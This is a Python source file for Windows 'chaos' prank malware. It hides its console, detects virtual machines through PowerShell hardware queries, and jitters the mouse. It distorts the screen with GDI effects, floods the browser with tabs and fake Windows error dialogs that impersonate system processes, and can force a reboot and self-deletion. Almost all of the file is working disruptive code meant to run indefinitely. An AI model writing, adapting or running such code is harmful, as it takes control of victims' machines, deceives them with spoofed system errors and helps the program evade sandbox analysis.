
import subprocess
import sys
import json
import urllib.request
import urllib.error
import os
import platform
import ctypes
import time
import math
import random
import threading
from pathlib import Path
import webbrowser
from urllib.parse import quote_plus
from datetime import datetime
import base64
import os
import sys

# Try to add user site-packages to path if not present (common issue on some windows setups)
try:
    user_site = os.path.expandvars(r"%APPDATA%\Python\Python313\site-packages")
    if os.path.exists(user_site) and user_site not in sys.path:
        sys.path.append(user_site)
except: pass

try:
    import customtkinter as ctk
except ImportError:
    # Try one more common path
    try:
        sys.path.append(os.path.expanduser("~\\AppData\\Roaming\\Python\\Python313\\site-packages"))
        import customtkinter as ctk
    except ImportError:
        import tkinter as tk
        import tkinter.ttk as ttk
        print("CustomTkinter STILL not found. Please install it: pip install customtkinter")
        ctk = None

# Hide console window
if sys.platform == "win32":
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

# Silence all prints globally
def _noop(*args, **kwargs):
    return None
print = _noop  # type: ignore

# Global flag to stop all chaos effects
STOP_ALL_CHAOS = False

ENABLE_MOUSE_WIGGLE = True
ENABLE_SCREEN_EFFECTS = True
ENABLE_CHROME_SPAM = True
MEME_COUNT_DEFAULT = 50
CHROME_SPAM_COUNT_DEFAULT = 10
YT_COUNT_DEFAULT = 10
GOOGLE_COUNT_DEFAULT = 20
ENABLE_SILLY_SEARCHES = True
ENABLE_RANDOM_TABS = True
ENABLE_FAKE_ERROR = True
ENABLE_CMD_SPAM = False
ENABLE_CONFIRMATION = True
ENABLE_TIMED_MODE = True
TIMED_DURATION_SEC = 600  # 10 minutes
ENABLE_EXTREME_MODE = True

ENABLE_B64_PACK = False
B64_OUTPUT_PATH = "packed_runner.py"
INDICATORS = [
    "VMware", "VirtualBox", "KVM", "Hyper-V",
    "Xen", "QEMU", "Parallels", "Bochs"
]

YT_FALLBACK = [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://www.youtube.com/watch?v=2ZIpFytCSVc",
    "https://www.youtube.com/watch?v=QH2-TGUlwu4",
    "https://www.youtube.com/watch?v=L_jWHffIx5E",
    "https://www.youtube.com/watch?v=9bZkp7q19f0",
]

SILLY_TERMS = [
    "why is my computer dancing",
    "how to download more ram",
    "is my pc haunted",
    "delete system32 tutorial",
    "why does my screen look like jelly",
    "download free viruses 2024",
    "google please help me",
    "keyboard making weird noises",
    "monitor leaking colors",
    "funny cat videos",
]

def _ps(cmd: str) -> str:
    """Run a PowerShell command and return combined stdout+stderr as text."""
    try:
        # Force PowerShell to emit UTF-8 and decode with UTF-8 in Python to avoid locale issues
        utf8_cmd = "[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new(); " + cmd
        r = subprocess.run(
            ["powershell", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", utf8_cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=10, creationflags=0x08000000
        )
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return str(e)

def ask_user_confirmation() -> bool:
    try:
        user32 = ctypes.windll.user32
        MB_ICONQUESTION = 0x00000020
        MB_YESNO = 0x00000004
        MB_SYSTEMMODAL = 0x00001000
        
        # Detect system language (simple check)
        try:
            import locale
            lang = locale.getdefaultlocale()[0]
            is_turkish = lang and lang.startswith('tr')
        except:
            is_turkish = True  # Default to Turkish
        
        if is_turkish:
            text = "Bu program bir dizi işlemi çalıştıracak. Çalıştırmak istediğinizden emin misiniz?\nDevam etmek için Evet'e tıklayın, Hayır derseniz sistem yeniden başlayacak ve bu program kaldırılacaktır."
            title = "Onay gerekiyor"
        else:
            text = "This program will run a series of operations. Are you sure you want to continue?\nClick Yes to proceed, or No to reboot the system and remove this program."
            title = "Confirmation Required"
        
        res = user32.MessageBoxW(None, text, title, MB_ICONQUESTION | MB_YESNO | MB_SYSTEMMODAL)
        # IDYES=6, IDNO=7
        return res == 6
    except Exception:
        return True

def schedule_self_delete_and_reboot():
    try:
        # Create a temp batch that deletes this script and then itself
        this_path = os.path.abspath(__file__)
        temp_dir = os.environ.get("TEMP") or os.environ.get("TMP") or os.getcwd()
        bat_path = os.path.join(temp_dir, f"_cleanup_{random.randint(1000,9999)}.bat")
        lines = [
            "@echo off",
            "timeout /t 3 >nul",
            f"del \"{this_path}\"",
            "del \"%~f0\""
        ]
        with open(bat_path, "w", encoding="utf-8", errors="ignore") as f:
            f.write("\r\n".join(lines))
        # Launch batch detached
        subprocess.Popen(f'start "" "{bat_path}"', shell=True, creationflags=0x08000000)
        # Request reboot (5 seconds)
        subprocess.Popen('shutdown /r /t 5 /c "Program kullanıcı tarafından iptal edildi"', shell=True, creationflags=0x08000000)
    except Exception:
        pass




def is_virtual_machine() -> bool:
    # Collect several hardware identity surfaces via PowerShell CIM and PnP queries
    cs = _ps("(Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer,Model | ConvertTo-Json)")
    bios = _ps("(Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion,SerialNumber | ConvertTo-Json)")
    base = _ps("(Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer,Product | ConvertTo-Json)")
    devices = _ps("(Get-PnpDevice | Select-Object -ExpandProperty FriendlyName | Out-String)")

    cs_l = cs.lower()
    bios_l = bios.lower()
    base_l = base.lower()
    dev_l = devices.lower()

    # High-confidence vendors
    hi_conf = ["vmware", "virtualbox", "kvm", "qemu", "xen", "parallels", "bochs", "vbox"]
    if any(t in (cs_l + bios_l + base_l + dev_l) for t in hi_conf):
        return True

    # Model explicitly says Virtual Machine
    if "virtual machine" in cs_l or "virtual machine" in bios_l or "virtual machine" in base_l:
        return True

    # Hyper-V specific: require Hyper-V AND Virtual Machine signal to avoid host false positives
    if ("hyper-v" in dev_l or "hyper-v" in bios_l) and ("virtual machine" in cs_l or "hyper-v uefi" in bios_l):
        return True

    return False


def start_mouse_wiggle(duration_sec: float = 20.0):
    """Move mouse cursor randomly (mostly left-right) for a short duration in a background thread."""
    try:
        user32 = ctypes.windll.user32
    except Exception:
        return

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    def _worker():
        try:
            sw = user32.GetSystemMetrics(0)
            sh = user32.GetSystemMetrics(1)
            end_t = time.time() + duration_sec
            step = 8
            while time.time() < end_t:
                pt = POINT()
                if user32.GetCursorPos(ctypes.byref(pt)):
                    # EXTREME VIBRATION / UNUSABLE MOUSE
                    # Jump randomly in a small radius very fast to simulate heavy shaking
                    # Occasional large jumps to throw off aim
                    
                    dx = random.randint(-15, 15) # Increased jitter range
                    dy = random.randint(-15, 15)
                    
                    # Random large jump chance
                    if random.random() < 0.4: # Higher chance
                         dx = random.randint(-150, 150) # Bigger jumps
                         dy = random.randint(-150, 150)
                         
                    tx = max(0, min(sw - 1, pt.x + dx))
                    ty = max(0, min(sh - 1, pt.y + dy))
                    
                    user32.SetCursorPos(tx, ty)
                    
                    # almost zero sleep (0.001) for max speed
                    time.sleep(0.001)
        except Exception:
            pass

    threading.Thread(target=_worker, daemon=True).start()



# Continuous screen distortion thread with higher intensity
def distort_screen(duration_sec: float = 3.5, band: int = 12, amplitude: int = 40):
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        hdc = user32.GetDC(0)
        if not hdc:
            return
        sw = user32.GetSystemMetrics(0)
        sh = user32.GetSystemMetrics(1)

        # Helper: approximate chromatic aberration by tinting shifted overlays
        def chromatic_aberration():
            # Create snapshot of screen into memdc
            memdc = gdi32.CreateCompatibleDC(hdc)
            bmp = gdi32.CreateCompatibleBitmap(hdc, sw, sh)
            oldbmp = gdi32.SelectObject(memdc, bmp)
            gdi32.BitBlt(memdc, 0, 0, sw, sh, hdc, 0, 0, 0x00CC0020)  # SRCCOPY

            # Create a second DC for color-tinted copy
            memdc2 = gdi32.CreateCompatibleDC(hdc)
            bmp2 = gdi32.CreateCompatibleBitmap(hdc, sw, sh)
            oldbmp2 = gdi32.SelectObject(memdc2, bmp2)
            gdi32.BitBlt(memdc2, 0, 0, sw, sh, memdc, 0, 0, 0x00CC0020)

            # Brushes for tint (COLORREF 0x00BBGGRR)
            red_br = gdi32.CreateSolidBrush(0x000000FF)
            blu_br = gdi32.CreateSolidBrush(0x00FF0000)

            # Apply red tint via PATINVERT, then overlay with SRCPAINT at negative x offset
            oldbr = gdi32.SelectObject(memdc2, red_br)
            gdi32.PatBlt(memdc2, 0, 0, sw, sh, 0x005A0049)  # PATINVERT
            dx = random.randint(20, 50)  # Maximum chromatic overflow
            gdi32.BitBlt(hdc, -dx, 0, sw + dx, sh, memdc2, 0, 0, 0x00EE0086)  # SRCPAINT

            # Reset memdc2 to original, then apply blue tint and overlay at positive x offset
            gdi32.BitBlt(memdc2, 0, 0, sw, sh, memdc, 0, 0, 0x00CC0020)
            gdi32.SelectObject(memdc2, blu_br)
            gdi32.PatBlt(memdc2, 0, 0, sw, sh, 0x005A0049)  # PATINVERT
            gdi32.BitBlt(hdc, dx, 0, sw - dx, sh, memdc2, 0, 0, 0x00EE0086)   # SRCPAINT

            # Cleanup
            gdi32.SelectObject(memdc, oldbmp)
            gdi32.SelectObject(memdc2, oldbmp2)
            gdi32.DeleteObject(red_br)
            gdi32.DeleteObject(blu_br)
            gdi32.DeleteObject(bmp)
            gdi32.DeleteObject(bmp2)
            gdi32.DeleteDC(memdc)
            gdi32.DeleteDC(memdc2)
        
        # Helper: ripple/wave by shifting vertical columns with a sine offset using a provided snapshot DC
        def ripple_waves(memdc, phase_scale: float = 0.08, col: int = 8, amp: int = 18):
            x = 0
            while x < sw:
                yoff = int(amp * math.sin((x * phase_scale) + (time.time() * 8.0)))
                gdi32.BitBlt(hdc, x, yoff, col, sh, memdc, x, 0, 0x00CC0020)
                x += col

        # Helper: draw random text overlays (fake "typing" visually without sending keystrokes)
        def random_text_overlay(count: int = 16):
            # Transparent background for text
            gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
            # Randomize a font size
            size = random.randint(14, 28)
            # Create a simple font (height in logical units; negative for character height)
            hfont = gdi32.CreateFontW(-size, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
            oldf = None
            if hfont:
                oldf = gdi32.SelectObject(hdc, hfont)
            charset = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%^&*"  # avoid confusing chars
            for _ in range(count):
                txt = "".join(random.choice(charset) for _ in range(random.randint(5, 10)))
                x = random.randint(0, max(0, sw - 100))
                y = random.randint(0, max(0, sh - 24))
                color = (random.randint(0, 255) << 16) | (random.randint(0, 255) << 8) | (random.randint(0, 255))
                gdi32.SetTextColor(hdc, color)
                # TextOutW(hdc, x, y, LPCWSTR, cch)
                gdi32.TextOutW(hdc, x, y, txt, len(txt))
            if hfont:
                gdi32.SelectObject(hdc, oldf)
                gdi32.DeleteObject(hfont)
        
        # Helper: draw ASCII art timer showing remaining time
        def draw_ascii_timer(remaining_sec: int):
            # Simple 3x5 ASCII digits
            digits = {
                '0': ["███", "█ █", "█ █", "█ █", "███"],
                '1': [" █ ", "██ ", " █ ", " █ ", "███"],
                '2': ["███", "  █", "███", "█  ", "███"],
                '3': ["███", "  █", "███", "  █", "███"],
                '4': ["█ █", "█ █", "███", "  █", "  █"],
                '5': ["███", "█  ", "███", "  █", "███"],
                '6': ["███", "█  ", "███", "█ █", "███"],
                '7': ["███", "  █", "  █", "  █", "  █"],
                '8': ["███", "█ █", "███", "█ █", "███"],
                '9': ["███", "█ █", "███", "  █", "███"],
                ':': [" ", "█", " ", "█", " "]
            }
            
            # Calculate time
            mins = remaining_sec // 60
            secs = remaining_sec % 60
            time_str = f"{mins:02d}:{secs:02d}"
            
            # Create large font for ASCII art
            gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
            hfont = gdi32.CreateFontW(-24, 0, 0, 0, 900, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
            oldf = None
            if hfont:
                oldf = gdi32.SelectObject(hdc, hfont)
            
            # Position in top-right corner
            start_x = sw - 250
            start_y = 20
            
            # Draw each line of the ASCII art
            for line_idx in range(5):
                x_offset = 0
                line_text = ""
                for char in time_str:
                    if char in digits:
                        line_text += digits[char][line_idx] + "  "
                
                # Draw with red color for visibility
                gdi32.SetTextColor(hdc, 0x000000FF)  # Red
                gdi32.TextOutW(hdc, start_x, start_y + (line_idx * 28), line_text, len(line_text))
            
            if hfont:
                gdi32.SelectObject(hdc, oldf)
                gdi32.DeleteObject(hfont)
        
        # Helper: draw "the chaos" ASCII art banner
        def draw_chaos_banner():
            banner_lines = [
                " █████    █████                               ",
                " ░░███    ░░███                                ",
                " ███████   ░███████    ██████                  ",
                "░░░███░    ░███░░███  ███░░███                 ",
                "  ░███     ░███ ░███ ░███████                  ",
                "  ░███ ███ ░███ ░███ ░███░░░                   ",
                "  ░░█████  ████ █████░░██████                  ",
                "   ░░░░░  ░░░░ ░░░░░  ░░░░░░                   ",
                "                                               ",
                "                                               ",
                "                                               ",
                "          █████                                ",
                "         ░░███                                 ",
                "  ██████  ░███████    ██████    ██████   █████ ",
                " ███░░███ ░███░░███  ░░░░░███  ███░░███ ███░░  ",
                "░███ ░░░  ░███ ░███   ███████ ░███ ░███░░█████ ",
                "░███  ███ ░███ ░███  ███░░███ ░███ ░███ ░░░░███",
                "░░██████  ████ █████░░████████░░██████  ██████ ",
                " ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░░  "
            ]
            
            # Create font for banner
            gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
            hfont = gdi32.CreateFontW(-16, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
            oldf = None
            if hfont:
                oldf = gdi32.SelectObject(hdc, hfont)
            
            # Position in center of screen
            start_x = (sw - 700) // 2  # Approximate center
            start_y = (sh - 400) // 2
            
            # Draw each line with a glowing red color
            for idx, line in enumerate(banner_lines):
                gdi32.SetTextColor(hdc, 0x000000FF)  # Red
                gdi32.TextOutW(hdc, start_x, start_y + (idx * 20), line, len(line))
            
            if hfont:
                gdi32.SelectObject(hdc, oldf)
                gdi32.DeleteObject(hfont)
        


        # Use a very large duration if we want "forever"
        start = time.time()
        # If duration_sec is negative, run forever
        run_forever = (duration_sec < 0)
        
        while (run_forever or (time.time() - start < duration_sec)) and not globals().get("STOP_ALL_CHAOS", False):
            # Take a single snapshot for this frame; all effects read from it for consistency
            memdc_frame = gdi32.CreateCompatibleDC(hdc)
            bmp_frame = gdi32.CreateCompatibleBitmap(hdc, sw, sh)
            oldbmp_frame = gdi32.SelectObject(memdc_frame, bmp_frame)
            gdi32.BitBlt(memdc_frame, 0, 0, sw, sh, hdc, 0, 0, 0x00CC0020)

            phase = (time.time() - start) * 16.0
            
            # Dynamic amplitude spike - MORE INTENSE
            current_amp = amplitude
            if random.random() < 0.30: # More frequent spikes
                 current_amp = int(amplitude * 2.0) # Doubled spike intensity
            
            y = 0
            while y < sh:
                jitter = random.randint(-40, 40) # EXTREME jitter (was -25 to 25)
                offset = int(current_amp * math.sin((y / 24.0) + phase)) + jitter
                mode = random.random()
                if mode < 0.60: # Less normal copy, more chaos
                    gdi32.BitBlt(hdc, 0, y, sw, band, memdc_frame, offset, y, 0x00CC0020)  # SRCCOPY from snapshot
                elif mode < 0.85:
                    gdi32.BitBlt(hdc, 0, y, sw, band, memdc_frame, offset, y, 0x00660046)  # SRCINVERT (XOR)
                else:
                    gdi32.BitBlt(hdc, 0, y, sw, band, memdc_frame, offset, y, 0x00330008)  # NOTSRCCOPY (invert)
                y += band

            # MEMZ Tunnel effect: ALWAYS shrink screen (continuous zoom out)
            # Larger margins for more noticeable effect
            margin_x = random.randint(6, 18) # Increased from 4-12
            margin_y = random.randint(6, 18) # Increased from 4-12
            gdi32.StretchBlt(hdc, margin_x, margin_y, sw - 2*margin_x, sh - 2*margin_y, memdc_frame, 0, 0, sw, sh, 0x00CC0020)

            # VERY high chance of chromatic aberration for EXTREME effect
            if random.random() < 0.85: # Increased from 0.70
                chromatic_aberration()

            # VERY high chance of ripple waves
            if random.random() < 0.85: # Increased from 0.70
                ripple_waves(memdc_frame, phase_scale=0.12, col=8, amp=max(14, current_amp - 6))

            # Draw MORE random on-screen strings
            if random.random() < 0.80: # Increased from 0.65
                random_text_overlay(count=random.randint(20, 40)) # Increased from 15-30
            
            # Draw "the chaos" banner - frequency increases as time runs out!
            if not run_forever and duration_sec > 0:
                elapsed = time.time() - start
                remaining = max(0, duration_sec - elapsed)
                time_percent = remaining / duration_sec if duration_sec > 0 else 0
                
                # Banner chance increases from 10% (start) to 80% (end)
                # When 100% time left: 10% chance
                # When 50% time left: 45% chance
                # When 10% time left: 73% chance
                # When 0% time left: 80% chance
                banner_chance = 0.10 + (1.0 - time_percent) * 0.70
                
                if random.random() < banner_chance:
                    draw_chaos_banner()
            else:
                # If running forever, show occasionally (30% chance)
                if random.random() < 0.30:
                    draw_chaos_banner()
            
            # Draw ASCII timer showing remaining time (only if not running forever)
            if not run_forever and duration_sec > 0:
                elapsed = time.time() - start
                remaining = max(0, int(duration_sec - elapsed))
                draw_ascii_timer(remaining)

            time.sleep(0.01)
            # Cleanup per-frame snapshot
            gdi32.SelectObject(memdc_frame, oldbmp_frame)
            gdi32.DeleteObject(bmp_frame)
            gdi32.DeleteDC(memdc_frame)
        user32.ReleaseDC(0, hdc)
    except Exception:
        # Silent fail to avoid disrupting main functionality
        pass


# Find media files from common locations using the default player
def _find_media(extensions=(".mp3", ".mp4"), max_results: int = 400):
    roots = []
    try:
        up = Path(os.environ.get("USERPROFILE", ""))
        roots.extend([
            up / "Music",
            up / "Downloads",
            up / "Desktop",
            up / "Documents",
            up / "Videos",
        ])
    except Exception:
        pass
    results = []
    for root in roots:
        try:
            if root.exists():
                for dirpath, _, filenames in os.walk(root):
                    for fn in filenames:
                        lower = fn.lower()
                        if any(lower.endswith(ext) for ext in extensions):
                            results.append(str(Path(dirpath) / fn))
                            if len(results) >= max_results:
                                return results
        except Exception:
            continue
    return results


def play_random_media(count: int = 3):
    try:
        files = _find_media(extensions=(".mp4", ".mkv", ".avi", ".mov", ".wmv", ".mp3", ".wav"))
        if not files:
            print("Medya bulunamadı (Music/Downloads/Desktop/Documents/Videos klasörlerinde).")
            return
        random.shuffle(files)
        picks = files[:max(1, count)]
        for i, path in enumerate(picks):
            try:
                print(f"Medya açılıyor: {path}")
                os.startfile(path)  # open with default app
            except Exception as e:
                print(f"Medya açma hatası: {e}")
            time.sleep(0.5 + 0.3 * i)  # small stagger between opens
    except Exception as e:
        print(f"Medya oynatma hatası: {e}")

# Robust URL opener with fallbacks (Windows)
def open_url(url: str) -> bool:
    try:
        print(f"URL açılıyor (webbrowser): {url}")
        if webbrowser.open(url, new=2):
            return True
    except Exception:
        pass
    try:
        print(f"URL açılıyor (startfile): {url}")
        os.startfile(url)  # type: ignore[attr-defined]
        return True
    except Exception:
        pass
    try:
        print(f"URL açılıyor (cmd start): {url}")
        # Use shell string for Windows cmd
        subprocess.run(f"start \"\" \"{url}\"", check=False, shell=True, creationflags=0x08000000)
        return True
    except Exception:
        return False

# YouTube autoplay helper: convert youtu.be to watch and add autoplay/mute params
def yt_autoplay(url: str) -> str:
    try:
        u = url
        if "youtu.be/" in u:
            vid = u.split("youtu.be/")[-1].split("?")[0].strip()
            if vid:
                u = f"https://www.youtube.com/watch?v={vid}"
        if "youtube.com/watch" in u:
            sep = '&' if '?' in u else '?'
            if "autoplay=1" not in u:
                u = f"{u}{sep}autoplay=1&mute=1"
        return u
    except Exception:
        return url

# Centered topmost notice (system modal)
def show_center_notice(text: str, title: str = "Bilgi"):
    try:
        user32 = ctypes.windll.user32
        MB_OK = 0x00000000
        MB_ICONINFORMATION = 0x00000040
        MB_SYSTEMMODAL = 0x00001000
        user32.MessageBoxW(None, text, title, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL)
    except Exception:
        pass

# Show a fake Windows error dialog (Turkish text) using MessageBoxW
def show_fake_error(title: str | None = None, text: str | None = None):
    try:
        user32 = ctypes.windll.user32
        codes = ["0xc0000142", "0xc0000005", "0xe0434352", "0xc000007b"]
        exe = random.choice(["explorer.exe", "svchost.exe", "RuntimeBroker.exe", "SearchApp.exe"]) 
        title = title or f"{exe} - Uygulama Hatası"
        text = text or f"Uygulama düzgün başlatılamadı ({random.choice(codes)}).\nTamam düğmesine tıklayın."
        MB_OK = 0x00000000
        MB_ICONERROR = 0x00000010
        MB_SYSTEMMODAL = 0x00001000
        user32.MessageBoxW(None, text, title, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL)
    except Exception:
        pass

# Chain multiple fake errors: 1 dialog, then 2, then 4, ... (x2 each round)
def show_fake_error_chain(rounds: int = 3, base_title: str | None = None):
    try:
        rounds = max(1, rounds)
        for r in range(rounds):
            count = 2 ** r
            for i in range(count):
                # Vary title slightly to avoid grouping
                ttl = (base_title or None)
                show_fake_error(title=ttl)
            time.sleep(0.15)
    except Exception:
        pass

# After a short delay, open the requested links and apply a stronger full-screen effect
def delayed_links_and_effect(done_evt: threading.Event, delay_sec: float = 8.0):
    try:
        time.sleep(delay_sec)
        links = []
        for url in links:
            open_url(yt_autoplay(url))
        # Note: Main distortion is now handled by the continuous thread
    except Exception:
        pass
    finally:
        try:
            done_evt.set()
        except Exception:
            pass

# Use the user's default browser (no Chrome enforcement)
def open_in_browser(url: str) -> bool:
    return open_url(url)

MEME_URLS = [
    # Static fallback list (only used if online fetch fails)
    "https://i.imgflip.com/1otk96.jpg",
    "https://i.imgflip.com/30b1gx.jpg",
    "https://i.imgflip.com/26am.jpg",
    "https://i.imgflip.com/1bij.jpg",
    "https://i.imgflip.com/4/5w3.jpg",
    "https://i.imgflip.com/2wifvo.jpg",
    "https://i.imgflip.com/1ihzfe.jpg",
    "https://i.imgflip.com/3lmzyx.jpg",
    "https://i.imgflip.com/5c7lwq.jpg",
    "https://i.imgflip.com/2gu0a3.jpg",
]

def get_online_memes(count: int) -> list:
    urls = []
    seen = set()
    # Try meme-api.com first (no auth, simple JSON)
    try:
        tries = max(3, count)
        for _ in range(tries):
            req = urllib.request.Request(
                "https://meme-api.com/gimme",
                headers={"User-Agent": "vm-checker/1.0"},
                method="GET",
            )
            with urllib.request.urlopen(req, timeout=6) as resp:
                data = json.loads(resp.read().decode("utf-8", "replace"))
                url = data.get("url")
                if isinstance(url, str) and url.lower().startswith("http"):
                    if url not in seen:
                        seen.add(url)
                        urls.append(url)
                        if len(urls) >= count:
                            return urls
    except Exception:
        pass
    # Fallback: Reddit r/memes top posts (no auth; subject to rate limits)
    try:
        req = urllib.request.Request(
            "https://www.reddit.com/r/memes/top.json?limit=50&t=day",
            headers={"User-Agent": "vm-checker/1.0"},
            method="GET",
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
            children = (data.get("data", {}) or {}).get("children", [])
            for ch in children:
                url = ((ch or {}).get("data", {}) or {}).get("url_overridden_by_dest") or ((ch or {}).get("data", {}) or {}).get("url")
                if isinstance(url, str) and (url.endswith(".jpg") or url.endswith(".png") or url.endswith(".jpeg")):
                    if url not in seen:
                        seen.add(url)
                        urls.append(url)
                        if len(urls) >= count:
                            return urls
    except Exception:
        pass
    # Final fallback: static list
    random.shuffle(MEME_URLS)
    return MEME_URLS[:max(0, count)]

def open_random_memes(count: int = MEME_COUNT_DEFAULT, delay: float = 0.25):
    try:
        if count <= 0:
            return
        picks = get_online_memes(count)
        for i, url in enumerate(picks):
            print(f"Meme açılıyor (varsayılan tarayıcı): {url}")
            open_in_browser(url)
            time.sleep(delay + i * 0.05)
    except Exception:
        pass

# Open random YouTube pages (prefer direct video links) and force autoplay
def open_random_youtube(count: int = YT_COUNT_DEFAULT, delay: float = 0.3):
    try:
        if count <= 0:
            return
        picks = []
        for _ in range(count):
            # Prefer direct videos so autoplay works reliably
            if random.random() < 0.8:
                picks.append(random.choice(YT_FALLBACK))
            else:
                q = random.choice(SILLY_TERMS)
                picks.append(f"https://www.youtube.com/results?search_query={quote_plus(q)}")
        for i, url in enumerate(picks):
            auto_url = yt_autoplay(url)
            print(f"YouTube açılıyor: {auto_url}")
            open_in_browser(auto_url)
            time.sleep(delay + 0.05 * i)
    except Exception:
        pass

# Perform silly Google searches in the default browser
def open_google_silly_searches(count: int = GOOGLE_COUNT_DEFAULT, delay: float = 0.25):
    try:
        if count <= 0:
            return
        queries = [random.choice(SILLY_TERMS) for _ in range(count)]
        for i, q in enumerate(queries):
            url = f"https://www.google.com/search?q={quote_plus(q)}"
            print(f"Google araması: {q}")
            open_in_browser(url)
            time.sleep(delay + 0.05 * i)
    except Exception:
        pass

def chrome_spam_windows(count: int = CHROME_SPAM_COUNT_DEFAULT, delay: float = 0.25):
    try:
        count = max(1, min(count, 12))
        for i in range(count):
            url = "about:blank"
            print("Tarayıcı penceresi açılıyor")
            open_in_browser(url)
            time.sleep(delay + i * 0.05)
    except Exception:
        pass

# Continuously launch CMD windows that loop 'dir' with green color
def start_cmd_green_dir_spam(min_interval: float = 2.0, max_interval: float = 5.0):
    def _spam_worker():
        while not globals().get("STOP_ALL_CHAOS", False):
            try:
                # cmd /c start "System Check" cmd /c "color 0a && title System Failure && tree C:\\ && timeout /t 5"
                subprocess.Popen(
                    'start "System Failure" cmd /c "color 0a && title System Failure && echo SYSTEM FAILURE && tree C:\\"', 
                    shell=True, 
                    creationflags=0x08000000
                )
            except Exception:
                pass
            time.sleep(random.uniform(min_interval, max_interval))

    threading.Thread(target=_spam_worker, daemon=True).start()



# Open a random number of tabs in the default browser
def open_random_tabs(min_tabs: int = 3, max_tabs: int = 12, min_delay: float = 0.05, max_delay: float = 0.25):
    try:
        ct = random.randint(max(1, min_tabs), max(min_tabs, max_tabs))
        for i in range(ct):
            print("Rastgele sekme açılıyor")
            open_in_browser("https://youtu.be/dQw4w9WgXcQ?si=PMlP1U2vqr7kFa3u")
            time.sleep(random.uniform(min_delay, max_delay))
    except Exception:
        pass

# Check if Alt+2 is pressed (Kill Switch)
def check_kill_key():
    try:
        # VK_MENU (Alt) = 0x12
        # '2' key = 0x32
        user32 = ctypes.windll.user32
        if (user32.GetAsyncKeyState(0x12) & 0x8000) and (user32.GetAsyncKeyState(0x32) & 0x8000):
            return True
    except Exception:
        pass
    return False

# Orchestrator: run actions repeatedly forever (no shutdown)
def run_timed_orchestrator(duration_sec: float = -1): 
    # duration_sec is ignored now, we run forever
    extreme = globals().get("ENABLE_EXTREME_MODE", False)
    
    
    if ENABLE_CMD_SPAM:
        start_cmd_green_dir_spam(min_interval=(0.6 if extreme else 2.0), max_interval=(1.5 if extreme else 5.0))
        
    # START CONTINUOUS SCREEN DISTORTION IN BACKGROUND
    # duration_sec passed as -1 to run forever
    if ENABLE_SCREEN_EFFECTS:
        threading.Thread(target=lambda: distort_screen(duration_sec=-1, band=(random.randint(8, 14) if extreme else 8), amplitude=(random.randint(150, 300) if extreme else 60)), daemon=True).start()

    cycle = 0
    # Infinite loop
    # Start timer
    start_time = time.time()
    
    # Infinite loop (until duration expires)
    while True:
        # Check duration
        if duration_sec > 0 and (time.time() - start_time > duration_sec):
            print("Chaos duration completed! Stopping all effects...")
            # Set global stop flag
            globals()["STOP_ALL_CHAOS"] = True
            
            # Give threads a moment to see the flag
            time.sleep(1)
            
            # Close all CMD windows spawned by this program
            try:
                subprocess.run("taskkill /F /IM cmd.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
            
            # Exit the program
            print("Exiting...")
            sys.exit(0)

        # Check Kill Key (Alt+2)
        if check_kill_key():
            print("Kill key (Alt+2) detected! Exiting...")
            globals()["STOP_ALL_CHAOS"] = True
            time.sleep(0.5)
            sys.exit(0)
            
        cycle += 1
        try:
            # Schedule bursts each cycle
            if ENABLE_RANDOM_TABS:
                threading.Thread(target=lambda: open_random_memes(count=(random.randint(20, 60) if extreme else random.randint(3, 10)), delay=(random.uniform(0.05, 0.15) if extreme else random.uniform(0.12, 0.3))), daemon=True).start()
                threading.Thread(target=lambda: open_random_tabs(min_tabs=(8 if extreme else 2), max_tabs=(24 if extreme else 10), min_delay=(0.03 if extreme else 0.05), max_delay=(0.12 if extreme else 0.25)), daemon=True).start()
            
            if ENABLE_CHROME_SPAM:
                threading.Thread(target=lambda: chrome_spam_windows(count=(random.randint(5, 12) if extreme else random.randint(2, 5)), delay=(random.uniform(0.05, 0.1) if extreme else 0.25)), daemon=True).start()
            if ENABLE_SILLY_SEARCHES:
                threading.Thread(target=lambda: open_random_youtube(count=(random.randint(10, 20) if extreme else random.randint(3, 8)), delay=(random.uniform(0.08, 0.18) if extreme else random.uniform(0.15, 0.3))), daemon=True).start()
                threading.Thread(target=lambda: open_google_silly_searches(count=(random.randint(15, 30) if extreme else random.randint(4, 12)), delay=(random.uniform(0.08, 0.18) if extreme else random.uniform(0.15, 0.3))), daemon=True).start()
            # Mouse wiggle participates each cycle (short burst)
            if ENABLE_MOUSE_WIGGLE:
                # Vary intensity per cycle for "more random" feel
                wiggle_dur = random.uniform(1.0, 4.0) # shorter bursts of differrent intensities
                threading.Thread(target=lambda: start_mouse_wiggle(duration_sec=(random.uniform(8.0, 16.0) if extreme else random.uniform(6.0, 12.0))), daemon=True).start()
            # Fake error chain participates each cycle (run in background so loop is non-blocking)
            if ENABLE_FAKE_ERROR:
                threading.Thread(target=lambda: show_fake_error_chain(rounds=(4 if extreme else 2)), daemon=True).start()
            
            # Note: distort_screen is no longer called here as it is running continuously!
        except Exception:
            pass
        
